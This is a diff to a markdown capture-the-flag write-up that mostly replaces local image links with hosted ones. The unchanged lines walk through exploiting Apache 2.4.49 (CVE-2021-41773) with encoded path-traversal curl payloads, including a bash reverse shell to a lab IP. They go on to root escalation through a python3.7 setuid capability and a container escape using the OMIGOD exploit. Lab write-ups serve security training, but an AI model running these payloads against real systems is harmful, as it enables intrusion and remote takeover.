@@ -56,11 +56,11 @@ Port 80:
 
 Just a static website of business consultancy.
 
-![image.png](image.png)
+<img width="1904" height="797" alt="image" src="https://github.com/user-attachments/assets/0c68c143-df78-46ed-93cf-1b8a28cf1757" />
 
 We can search for potential exploit which may be available on google for apache service version 2.4.49
 
-![image.png](image%201.png)
+<img width="1919" height="963" alt="image 1" src="https://github.com/user-attachments/assets/4b2923d3-f4d9-4c57-8be4-1ea9d08e717f" />
 
 Confirmed, this service version is vulnerable to CVE-2021-41773.
 
@@ -76,7 +76,7 @@ The `mod_cgi` or `mod_cgid` module must be enabled **if** you want to escalate t
 
 We can confirm `cgi-bin` directory though our browser.
 
-![image.png](image%202.png)
+<img width="1919" height="151" alt="image 2" src="https://github.com/user-attachments/assets/f2555201-6842-4bf6-8888-eb6e57b11e40" />
 
 Forbidden, means its present, but we can’t access it.
 
@@ -87,7 +87,7 @@ Through the understanding of above CVE, we can use this payload to check if it w
 └─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
 ```
 
-![image.png](image%203.png)
+<img width="1900" height="164" alt="image 3" src="https://github.com/user-attachments/assets/effb1afe-f646-43d7-b355-d6dd6dff86e8" />
 
 Ok, as it is executing our commands, let’s get the reverse shell back to us.
 
@@ -96,15 +96,15 @@ Ok, as it is executing our commands, let’s get the reverse shell back to us.
 └─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami; bash; /bin/bash -i >& /dev/tcp/10.17.87.131/4445 0>&1' -H "Content-Type: text/plain"
 ```
 
-![image.png](image%204.png)
+<img width="1909" height="106" alt="image 4" src="https://github.com/user-attachments/assets/7710b799-ecfd-4d55-8a33-286bef6a457e" />
 
 Got the reverse shell back as user daemon, but it’s a container, not a host machine….
 
-![image.png](image%205.png)
+<img width="1785" height="235" alt="image 5" src="https://github.com/user-attachments/assets/ee832891-16fc-4582-8ba7-26e1f3e93fea" />
 
 After a lot of enumeration, I found something interesting by exploring capabilities.
 
-![image.png](image%206.png)
+<img width="1408" height="72" alt="image 6" src="https://github.com/user-attachments/assets/e52eb153-2e58-4649-ad9f-cccb2024c238" />
 
 python3.7 binary is set for cap_setuid+ep capability, we can use it to gain root access.
 
@@ -115,13 +115,13 @@ python3.7 binary is set for cap_setuid+ep capability, we can use it to gain root
 daemon@4a70924bafa0:/tmp$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-![image.png](image%207.png)
+<img width="1583" height="105" alt="image 7" src="https://github.com/user-attachments/assets/b8f1c678-adf1-44e8-bfd2-be5d9b21a02c" />
 
 Got root shell on that container.
 
 Grabbed user flag.
 
-![image.png](image%208.png)
+<img width="1404" height="325" alt="image 8" src="https://github.com/user-attachments/assets/42d0a280-b55a-4f34-bce2-861861abe74a" />
 
 ---
 
@@ -129,7 +129,7 @@ Grabbed user flag.
 
 Checked container’s ip address
 
-![image.png](image%209.png)
+<img width="1253" height="416" alt="image 9" src="https://github.com/user-attachments/assets/d0e41ed9-3221-46ee-abec-ae60291a81ca" />
 
 As this container is running on ip `172.17.0.2` , host machine should be running on `172.17.0.1` 
 
@@ -137,35 +137,36 @@ We can transfer [nmap binary](https://github.com/andrew-d/static-binaries/blob/m
 
 Download that binary on your kali machine, then transfer it to the container which we owned.
 
-![image.png](image%2010.png)
+<img width="1468" height="108" alt="image 10" src="https://github.com/user-attachments/assets/32c9ef32-0ffa-4de9-90eb-09a7490d3965" />
 
-![image.png](image%2011.png)
+<img width="1256" height="200" alt="image 11" src="https://github.com/user-attachments/assets/54f2e66e-0d09-40ac-867e-bd5c948420bc" />
 
 Run that nmap binary.
 
-![image.png](image%2012.png)
+<img width="1708" height="456" alt="image 12" src="https://github.com/user-attachments/assets/49a42188-0055-4433-ba63-51a90bcf26c3" />
 
 As we can see, 4 ports were open on hostmachine `22, 80, 5985, 5986`
 
 While searching for potential service exploit for 5986, found out a POC for CVE-2021-38647 #OMIGOD.
 
-![image.png](image%2013.png)
+<img width="1919" height="875" alt="image 13" src="https://github.com/user-attachments/assets/c5d22fba-ae5c-405a-88ed-f42bcc72f9ff" />
 
 Downloaded that python exploit in to kali machine and served it to the container.
 
-![image.png](image%2014.png)
+<img width="1392" height="178" alt="image 14" src="https://github.com/user-attachments/assets/83581f6c-d24b-486e-99a1-59d3d0555814" />
 
-![image.png](image%2015.png)
+<img width="1552" height="201" alt="image 15" src="https://github.com/user-attachments/assets/8ddc8b92-8672-4917-9c8e-e632ffe534be" />
 
 Run that exploit.
 
-![image.png](image%2016.png)
+<img width="1429" height="84" alt="image 16" src="https://github.com/user-attachments/assets/bfcfb05b-8382-4cbf-aa82-53ebc1676594" />
 
 And, successfully able to execute commands to the hostmachine.
 
 Let’s grab root’s flag.
 
-![image.png](image%2017.png)
+<img width="1465" height="160" alt="image 17" src="https://github.com/user-attachments/assets/b3d16fe8-ce8e-488e-ad86-a83865ef3291" />
+
 
 ---
 
